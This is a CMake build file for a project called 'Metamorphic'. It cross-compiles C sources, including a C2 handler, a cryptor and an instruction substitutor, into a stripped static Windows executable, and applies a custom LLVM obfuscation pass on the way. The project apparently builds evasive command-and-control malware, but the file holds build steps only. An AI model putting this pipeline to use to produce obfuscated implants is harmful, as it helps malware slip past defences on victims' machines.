cmake_minimum_required(VERSION 3.15)
project(Metamorphic)

# set(CMAKE_VERBOSE_MAKEFILE ON)

# Specify Clang compilers
set(CMAKE_C_COMPILER "clang-16")

# Set target system and architecture
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_SYSTEM_PROCESSOR x86_64)

# Specify Clang flags to target Windows (MinGW-w64)
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} --target=x86_64-w64-mingw32")
set(CMAKE_EXE_LINKER_FLAGS "-static")

# Add Correct LLVM Version to CMake Module Path
list(APPEND CMAKE_MODULE_PATH "/usr/lib/llvm-16/lib/cmake/llvm") # llvm version needs to match clang and opt
include(AddLLVM)

# Set policy CMP0075 to NEW to handle include file checks as per CMake 3.11 and above
if(POLICY CMP0075)
  cmake_policy(SET CMP0075 NEW)
endif()

# Import LLVM 16 Config
find_package(LLVM 16 REQUIRED CONFIG)

# Create shared library for LLVM pass
add_library(encryption_pass SHARED lib/encryption_pass.cpp)

# Set the correct linker language (C++ for the pass)
set_target_properties(encryption_pass PROPERTIES LINKER_LANGUAGE CXX)

# Target-specific include directories for encryption_pass
target_include_directories(encryption_pass PRIVATE ${LLVM_INCLUDE_DIRS})

# Add LLVM 16 Config Definitions to CMake
target_compile_definitions(encryption_pass PRIVATE ${LLVM_DEFINITIONS})

# Source files
set(SOURCE_FILES
    src/core/main.c
    src/core/c2_handler.c
    src/core/control_flow_handler.h
    src/core/control_flow_handler.c
    src/core/cryptor.h
    src/core/cryptor.c
    src/core/instruction_substitutor.c
    src/data/adjacency_table.h
    src/data/adjacency_table.c
    src/data/config.h
    src/data/config.c
    src/crypto/aes.h
    src/crypto/kdf.h
    src/crypto/rsa.h
)

# Output executable
add_executable(metamorphic ${SOURCE_FILES})

# Output directory and Linked Language
set_target_properties(metamorphic PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/out"
    LINKER_LANGUAGE C
)

# Include MinGW headers
target_include_directories(metamorphic
    PRIVATE /usr/x86_64-w64-mingw32/include/
)

# Link MinGW libraries
target_link_directories(metamorphic
    PRIVATE /usr/lib/gcc/x86_64-w64-mingw32/13-win32/
    PRIVATE /usr/x86_64-w64-mingw32/lib/
)

# Compile sources into LLVM bitcode
add_custom_command(
    OUTPUT ${CMAKE_BINARY_DIR}/out/main.bc
    COMMAND clang -S -emit-llvm -o ${CMAKE_BINARY_DIR}/out/main.bc
            ${SOURCE_FILES} --target=x86_64-w64-mingw32 -I/usr/x86_64-w64-mingw32/include/
    COMMENT "Generating LLVM bitcode for main sources"
)

# Apply the encryption_pass shared library on the bitcode
add_custom_command(
    OUTPUT ${CMAKE_BINARY_DIR}/out/main_pass.bc
    COMMAND opt -load ${CMAKE_BINARY_DIR}/libencryption_pass.so -encryption-pass
            -o ${CMAKE_BINARY_DIR}/out/main_pass.bc ${CMAKE_BINARY_DIR}/out/main.bc
    DEPENDS ${CMAKE_BINARY_DIR}/out/main.bc ${CMAKE_BINARY_DIR}/libencryption_pass.so
    COMMENT "Running the encryption_pass on LLVM bitcode"
)

# Link the transformed bitcode into an executable
add_custom_command(
    OUTPUT ${CMAKE_BINARY_DIR}/out/metamorphic.exe
    COMMAND clang -o ${CMAKE_BINARY_DIR}/out/metamorphic.exe
            ${CMAKE_BINARY_DIR}/out/main_pass.bc --target=x86_64-w64-mingw32 -static
    DEPENDS ${CMAKE_BINARY_DIR}/out/main_pass.bc
    COMMENT "Linking final executable from transformed LLVM bitcode"
)

# Add dependencies between the executable and custom commands
# Link the custom commands to a dummy target
add_custom_target(generate_bitcode DEPENDS ${CMAKE_BINARY_DIR}/out/main.bc)
add_custom_target(apply_pass DEPENDS ${CMAKE_BINARY_DIR}/out/main_pass.bc)
add_custom_target(link_executable)

# Post-build actions after building the executable
add_custom_target(post_build_commands
    COMMAND strip ${CMAKE_BINARY_DIR}/out/metamorphic.exe
    COMMAND strings ${CMAKE_BINARY_DIR}/out/metamorphic.exe > ${CMAKE_BINARY_DIR}/out/metamorphic_strings.txt
    COMMAND objdump -d ${CMAKE_BINARY_DIR}/out/metamorphic.exe > ${CMAKE_BINARY_DIR}/out/metamorphic_disasm.txt
    COMMENT "Post-build actions: stripping, disassembling, and string extraction"
)

# Set the build order: make sure the executable is generated after the bitcode and pass application
add_dependencies(metamorphic generate_bitcode apply_pass link_executable)

# Ensure post-build actions are triggered after the executable is created
add_dependencies(post_build_commands metamorphic)